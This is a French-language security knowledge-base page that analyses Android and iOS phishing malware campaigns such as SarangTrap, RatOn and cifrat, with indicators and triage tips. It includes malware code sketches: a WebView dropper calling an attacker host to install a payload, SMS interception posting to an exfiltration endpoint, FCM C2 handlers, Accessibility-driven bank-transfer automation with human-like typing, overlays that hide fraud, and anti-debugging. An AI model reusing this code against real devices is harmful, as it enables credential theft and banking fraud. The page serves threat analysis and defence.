# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Cette page couvre des techniques utilisées par des threat actors pour distribuer des **APKs Android malveillants** et des **profils de configuration mobile iOS** via phishing (SEO, social engineering, faux stores, applications de rencontre, etc.).
> Le contenu est adapté de la campagne SarangTrap exposée par Zimperium zLabs (2025) et d'autres recherches publiques.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Enregistrer des dizaines de domaines ressemblants (rencontre, partage cloud, service auto…).
– Utiliser des mots-clés en langue locale et des emojis dans l'élément `<title>` pour remonter dans Google.
– Héberger *à la fois* Android (`.apk`) et les instructions d'installation iOS sur la même page d'atterrissage.
2. **First Stage Download**
* Android: lien direct vers un APK *unsigned* ou « third-party store ».
* iOS: `itms-services://` ou lien HTTPS simple vers un profil **mobileconfig** malveillant (voir ci-dessous).
3. **Post-install Social Engineering**
* Au premier lancement, l'app demande un **code d'invitation / vérification** (illusion d'accès exclusif).
* Le code est **POSTed over HTTP** vers le Command-and-Control (C2).
* C2 répond `{"success":true}` ➜ le malware continue.
* L'analyse dynamique en sandbox / AV qui n'envoie jamais un code valide ne voit **aucun comportement malveillant** (evasion).
4. **Runtime Permission Abuse** (Android)
* Les permissions dangereuses ne sont demandées **qu'après une réponse positive du C2** :
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Les variantes récentes **suppriment `<uses-permission>` pour SMS de `AndroidManifest.xml`** mais laissent le chemin de code Java/Kotlin qui lit les SMS via reflection ⇒ réduit le score statique tout en restant fonctionnel sur les appareils qui accordent la permission via l'abus de `AppOps` ou de vieilles cibles.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 a introduit **Restricted settings** pour les apps sideloaded : les bascules Accessibility et Notification Listener sont grisées jusqu'à ce que l'utilisateur autorise explicitement les restricted settings dans **App info**.
* Les pages de phishing et les droppers fournissent désormais des instructions UI étape par étape pour **allow restricted settings** pour l'app sideloaded, puis activer Accessibility/Notification access.
* Un contournement plus récent consiste à installer la charge utile via un flux **session-based PackageInstaller** (la même méthode que celle utilisée par les app stores). Android traite alors l'app comme installée par un store, donc Restricted settings ne bloque plus Accessibility.
* Indice de triage : dans un dropper, cherchez `PackageInstaller.createSession/openSession` plus du code qui amène immédiatement la victime vers `ACTION_ACCESSIBILITY_SETTINGS` ou `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Facade UI & Background Collection**
* L'app affiche des vues inoffensives (lecteur SMS, sélecteur de galerie) implémentées localement.
* Pendant ce temps, elle exfiltre :
- IMEI / IMSI, numéro de téléphone
- Dump complet de `ContactsContract` (tableau JSON)
- JPEG/PNG depuis `/sdcard/DCIM` compressés avec [Luban](https://github.com/Curzibn/Luban) pour réduire la taille
- Contenu SMS optionnel (`content://sms`)
Les payloads sont **batch-zipped** et envoyés via `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* Un seul **mobile-configuration profile** peut demander `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. pour inscrire l'appareil dans une supervision de type “MDM”.
* Instructions de social engineering :
1. Ouvrir Settings ➜ *Profile downloaded*.
2. Appuyer sur *Install* trois fois (captures d'écran sur la page de phishing).
3. Faire confiance au profil unsigned ➜ l'attaquant obtient les droits *Contacts* & *Photo* sans revue de l'App Store.
8. **iOS Web Clip Payload (phishing app icon)**
* Les payloads `com.apple.webClip.managed` peuvent **épingler une URL de phishing sur l'écran d'accueil** avec une icône/étiquette brandée.
* Les Web Clips peuvent s'exécuter en **plein écran** (cache l'interface du navigateur) et être marqués **non-removable**, forçant la victime à supprimer le profil pour retirer l'icône.
9. **Network Layer**
* HTTP en clair, souvent sur le port 80 avec un en-tête HOST du type `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (pas de TLS → facile à repérer).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Pendant l'évaluation du malware, automatisez l'étape du code d'invitation avec Frida/Objection pour atteindre la branche malveillante.
* **Manifest vs. Runtime Diff** – Comparez `aapt dump permissions` avec `PackageManager#getRequestedPermissions()` en runtime ; des permissions dangereuses manquantes sont un signal d'alerte.
* **Network Canary** – Configurez `iptables -p tcp --dport 80 -j NFQUEUE` pour détecter des rafales de POST non solides après la saisie du code.
* **mobileconfig Inspection** – Utilisez `security cms -D -i profile.mobileconfig` sur macOS pour lister `PayloadContent` et repérer des entitlements excessifs.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indicateurs (génériques)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Ce pattern a été observé dans des campagnes abusant de thèmes d’avantages gouvernementaux pour voler des identifiants UPI indiens et des OTP. Les opérateurs enchaînent des plateformes réputées pour la livraison et la résilience.

### Chaîne de livraison à travers des plateformes de confiance
- Appât vidéo YouTube → la description contient un short link
- Shortlink → site de phishing GitHub Pages imitant le portail legit
- Le même repo GitHub héberge un APK avec un faux badge “Google Play” pointant directement vers le fichier
- Les pages de phishing dynamiques tournent sur Replit ; le canal de commande distant utilise Firebase Cloud Messaging (FCM)

### Dropper avec payload intégré et installation hors ligne
- Le premier APK est un installer (dropper) qui embarque le vrai malware dans `assets/app.apk` et demande à l’utilisateur de désactiver le Wi‑Fi/les données mobiles pour réduire la détection cloud.
- Le payload embarqué s’installe sous un label anodin (par ex., “Secure Update”). Après l’installation, l’installer et le payload sont présents comme apps séparées.

Conseil de triage statique (grep pour les payloads embarqués) :
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Découverte dynamique des endpoints via shortlink
- Le malware récupère une liste en texte brut, séparée par des virgules, des endpoints actifs depuis un shortlink ; de simples transformations de chaîne produisent le chemin final de la page de phishing.

Exemple (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Harvesting d'identifiants UPI basé sur WebView
- L’étape « Make payment of ₹1 / UPI‑Lite » charge un formulaire HTML de l’attaquant depuis le endpoint dynamique dans un WebView et capture des champs sensibles (phone, bank, UPI PIN) qui sont `POST`és vers `addup.php`.

Chargeur minimal :
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Auto-propagation and interception of SMS/OTP
- Des autorisations agressives sont demandées au premier lancement :
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Les contacts sont utilisés pour envoyer en masse des SMS de smishing depuis l’appareil de la victime.
- Les SMS entrants sont interceptés par un broadcast receiver et téléversés avec des métadonnées (expéditeur, contenu, slot SIM, identifiant aléatoire par appareil) vers `/addsm.php`.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) comme C2 résilient
- Le payload s'enregistre auprès de FCM ; les messages push transportent un champ `_type` utilisé comme switch pour déclencher des actions (par ex., mettre à jour les modèles de texte de phishing, activer/désactiver des comportements).

Exemple de payload FCM :
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Esquisse du gestionnaire :
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK contient un payload secondaire à `assets/app.apk`
- WebView charge le paiement depuis `gate.htm` et exfiltre vers `/addup.php`
- Exfiltration de SMS vers `/addsm.php`
- Récupération de configuration pilotée par shortlink (p. ex., `rebrand.ly/*`) renvoyant des endpoints CSV
- Apps étiquetées comme génériques “Update/Secure Update”
- Messages FCM `data` avec un discriminateur `_type` dans des apps non fiables

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Les attaquants remplacent de plus en plus les liens APK statiques par un canal Socket.IO/WebSocket intégré dans des leurres ressemblant à Google Play. Cela masque l’URL du payload, contourne les filtres d’URL/d’extension, et conserve une UX d’installation réaliste.

Flux client typique observé dans la nature :

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Pourquoi cela contourne les contrôles simples :
- Aucune URL APK statique n’est exposée ; le payload est reconstruit en mémoire à partir de trames WebSocket.
- Les filtres URL/MIME/extension qui bloquent les réponses .apk directes peuvent manquer les données binaires acheminées via WebSockets/Socket.IO.
- Les crawlers et sandboxes d’URL qui n’exécutent pas les WebSockets ne récupéreront pas le payload.

Voir aussi WebSocket tradecraft et tooling :

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Abuse de Android Accessibility/Overlay & Device Admin, automatisation ATS, et orchestration de relais NFC – étude de cas RatOn

La campagne banker/RAT RatOn (ThreatFabric) est un exemple concret de la façon dont les opérations modernes de mobile phishing combinent des droppers WebView, l’automatisation d’interface pilotée par Accessibility, des overlays/ransom, la coercition Device Admin, le Automated Transfer System (ATS), la prise de contrôle de crypto wallets, et même l’orchestration de relais NFC. Cette section abstrait les techniques réutilisables.

### Stage-1 : pont WebView → install natif (dropper)
Les attaquants présentent un WebView pointant vers une page attaquante et injectent une interface JavaScript qui expose un installateur natif. Un tap sur un bouton HTML appelle du code natif qui installe un APK de second stage inclus dans les assets du dropper, puis le lance directement.

Pattern minimal :

<details>
<summary>Pattern minimal du dropper Stage-1 (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML sur la page :
```html
<button onclick="bridge.installApk()">Install</button>
```
Après l'installation, le dropper lance le payload via package/activity explicite :
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: des applis non fiables qui appellent `addJavascriptInterface()` et exposent des méthodes de type installateur à WebView; APK qui embarque une charge utile secondaire sous `assets/` et utilise le Package Installer Session API.

### Funnel de consentement : Accessibility + Device Admin + invites runtime de suivi
La stage-2 ouvre un WebView qui héberge une page “Access”. Son bouton invoque une méthode exportée qui amène la victime dans les réglages Accessibility et demande d’activer le service rogue. Une fois accordé, le malware utilise Accessibility pour cliquer automatiquement à travers les boîtes de dialogue d’autorisations runtime suivantes (contacts, overlay, manage system settings, etc.) et demande Device Admin.

- Accessibility aide par programmation à accepter les invites ultérieures en trouvant des boutons comme “Allow”/“OK” dans le node-tree et en déclenchant des clics.
- Vérification/demande d’autorisation overlay :
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Voir aussi :

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Les opérateurs peuvent émettre des commandes pour :
- afficher un overlay plein écran depuis une URL, ou
- transmettre du HTML inline chargé dans un overlay WebView.

Utilisations probables : coercition (saisie du PIN), ouverture du wallet pour capturer les PINs, message de rançon. Conservez une commande pour garantir que l’autorisation de l’overlay est accordée si elle manque.

### Modèle de contrôle à distance – pseudo-écran texte + screen-cast
- Faible bande passante : vider périodiquement l’arbre de nœuds Accessibility, sérialiser les textes/roles/bounds visibles et les envoyer à C2 comme pseudo-écran (commandes comme `txt_screen` une fois et `screen_live` en continu).
- Haute fidélité : demander MediaProjection et lancer le screen-casting/l’enregistrement à la demande (commandes comme `display` / `record`).

### Playbook ATS (automatisation d’appli bancaire)
À partir d’une tâche JSON, ouvrir l’appli bancaire, piloter l’UI via Accessibility avec un mélange de requêtes texte et de taps par coordonnées, puis saisir le PIN de paiement de la victime lorsqu’il est demandé.

Exemple de tâche :
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Exemples de textes vus dans un flux cible (CZ → EN) :
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Les opérateurs peuvent aussi vérifier/augmenter les limites de transfert via des commandes comme `check_limit` et `limit` qui naviguent dans l'UI des limites de la même manière.

### Crypto wallet seed extraction
Cibles comme MetaMask, Trust Wallet, Blockchain.com, Phantom. Flux : déverrouiller (PIN volé ou mot de passe fourni), aller à Security/Recovery, révéler/afficher la seed phrase, la récupérer via keylogger/exfiltration. Implémentez des sélecteurs sensibles à la locale (EN/RU/CZ/SK) pour stabiliser la navigation entre les langues.

### Device Admin coercion
Les API Device Admin sont utilisées pour augmenter les opportunités de capture de PIN et frustrer la victime :

- Verrouillage immédiat :
```java
dpm.lockNow();
```
- Expire current credential pour forcer le changement (Accessibility capture le nouveau PIN/mot de passe):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forcer le déverrouillage non biométrique en désactivant les fonctionnalités biométriques de keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Beaucoup de contrôles `DevicePolicyManager` nécessitent `Device Owner`/`Profile Owner` sur les versions récentes d'Android ; certaines builds OEM peuvent être moins strictes. Validez toujours sur l'OS/OEM cible.

### NFC relay orchestration (NFSkate)
Stage-3 peut installer et lancer un module NFC-relay externe (par ex., `NFSkate`) et même lui fournir un template HTML pour guider la victime pendant le relay. Cela permet un cash-out contactless card-present en parallèle de `ATS` en ligne.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: rythme de texte humain et injection double de texte (Herodotus)

Les threat actors combinent de plus en plus l'automatisation pilotée par `Accessibility` avec une anti-détection ajustée contre des biometrics comportementales basiques. Un banker/RAT récent montre deux modes complémentaires de livraison de texte et un toggle opérateur pour simuler une saisie humaine avec un rythme aléatoire.

- Discovery mode: énumérer les nœuds visibles avec des sélecteurs et des bounds pour cibler précisément les entrées (ID, text, contentDescription, hint, bounds) avant d'agir.
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT` directement sur le nœud cible (stable, sans keyboard);
- Mode 2 – clipboard set + `ACTION_PASTE` dans le nœud focalisé (fonctionne quand `setText` direct est bloqué).
- Human-like cadence: découper la chaîne fournie par l'opérateur et l'envoyer caractère par caractère avec des délais aléatoires de 300 à 3000 ms entre les événements pour contourner les heuristiques de “machine-speed typing”. Implémenté soit en faisant croître progressivement la valeur via `ACTION_SET_TEXT`, soit en collant un caractère à la fois.

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Blocage des overlays pour fraud cover :
- Rendre un `TYPE_ACCESSIBILITY_OVERLAY` plein écran avec une opacité contrôlée par l'opérateur ; le garder opaque pour la victime pendant que l'automatisation distante se poursuit en dessous.
- Commandes généralement exposées : `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Overlay minimal avec alpha ajustable :
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator control primitives often seen: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## Dropper Android multi-étapes avec WebView bridge, décodeur de chaînes JNI, et chargement DEX étagé

L’analyse de CERT Polska du 03 avril 2026 de **cifrat** est une bonne référence pour un loader Android moderne livré par phishing, où l’APK visible n’est qu’un shell d’installation. La technique réutilisable n’est pas le nom de famille, mais la manière dont les étapes sont chaînées :

1. La page de phishing livre un APK leurre.
2. L’étape 0 demande `REQUEST_INSTALL_PACKAGES`, charge un `.so` natif, déchiffre un blob embarqué, et installe l’étape 2 avec des **PackageInstaller sessions**.
3. L’étape 2 déchiffre un autre asset caché, le traite comme un ZIP, et **charge dynamiquement un DEX** pour le RAT final.
4. L’étape finale abuse de Accessibility/MediaProjection et utilise WebSockets pour le contrôle/les données.

### WebView JavaScript bridge comme contrôleur de l’installateur

Au lieu d’utiliser WebView uniquement pour un faux branding, le leurre peut exposer un bridge qui permet à une page locale/distante de fingerprint l’appareil et de déclencher la logique d’installation native :
```java
webView.addJavascriptInterface(controller, "Android");
webView.loadUrl("file:///android_asset/bootstrap.html");

@JavascriptInterface
public String get_SYSINFO() { /* SDK, model, manufacturer, locale */ }

@JavascriptInterface
public void start() { mainHandler.post(this::installStage2); }
```
Idées de triage :
- grep pour `addJavascriptInterface`, `@JavascriptInterface`, `loadUrl("file:///android_asset/` et les URL de phishing distantes utilisées dans la même activity
- surveillez les bridges qui exposent des méthodes de type installateur (`start`, `install`, `openAccessibility`, `requestOverlay`)
- si le bridge est alimenté par une page de phishing, considérez-le comme une surface operator/controller, pas juste une UI

### Décodage natif de chaînes enregistré dans `JNI_OnLoad`

Un pattern utile est une méthode Java qui semble inoffensive mais qui est en réalité alimentée par `RegisterNatives` pendant `JNI_OnLoad`. Dans cifrat, le decoder ignorait le premier caractère, utilisait le second comme clé XOR sur 1 octet, décodait le reste en hex, puis transformait chaque octet comme `((b - i) & 0xff) ^ key`.

Reproduction offline minimale:
```python
def decode_native(s: str) -> str:
key = ord(s[1]); raw = bytes.fromhex(s[2:])
return bytes((((b - i) & 0xFF) ^ key) for i, b in enumerate(raw)).decode()
```
Utilisez ceci lorsque vous voyez :
- des appels répétés à une seule méthode Java native-backed pour des URLs, des noms de package ou des clés
- `JNI_OnLoad` qui résout des classes et appelle `RegisterNatives`
- aucune chaîne plaintext significative dans le DEX, mais de nombreuses petites constantes ressemblant à du hex passées à un seul helper

### Layered payload staging: XOR resource -> installed APK -> RC4-like asset -> ZIP -> DEX

Cette famille utilisait deux couches de dépacking qui valent la peine d’être recherchées de manière générique :

- **Stage 0** : déchiffrer `res/raw/*.bin` avec une clé XOR dérivée via le native decoder, puis installer le APK en clair via `PackageInstaller.createSession` -> `openWrite` -> `fsync` -> `commit`
- **Stage 2** : extraire un asset anodin comme `FH.svg`, le déchiffrer avec une routine de type RC4, parser le résultat comme un ZIP, puis charger des fichiers DEX cachés

C’est un fort indicateur d’une vraie chaîne dropper/loader, car chaque couche garde la suivante opaque pour une analyse statique basique.

Quick triage checklist:
- `REQUEST_INSTALL_PACKAGES` plus les appels de session `PackageInstaller`
- des receivers pour `PACKAGE_ADDED` / `PACKAGE_REPLACED` afin de continuer la chaîne après l’installation
- des blobs chiffrés sous `res/raw/` ou `assets/` avec des extensions non-media
- `DexClassLoader` / `InMemoryDexClassLoader` / gestion ZIP à proximité de decryptors custom

### Native anti-debugging through `/proc/self/maps`

Le bootstrap native a aussi scanné `/proc/self/maps` à la recherche de `libjdwp.so` et a abandonné si présent. C’est un contrôle anti-analysis précoce pratique, car le debugging basé sur JDWP laisse une bibliothèque mappée reconnaissable :
```c
FILE *f = fopen("/proc/self/maps", "r");
while (fgets(line, sizeof(line), f)) {
if (strstr(line, "libjdwp.so")) return -1;
}
```
Idées de hunting :
- grep le code natif / la sortie du decompiler pour `/proc/self/maps`, `libjdwp.so`, `frida`, `qemu`, `goldfish`, `ranchu`
- si les hooks Frida arrivent trop tard, inspecter d’abord `.init_array` et `JNI_OnLoad`
- traiter anti-debug + string decoder + staged install comme un seul cluster, pas comme des findings indépendants

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Analysis of cifrat: could this be an evolution of a mobile RAT?](https://cert.pl/en/posts/2026/04/cifrat-analysis/)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
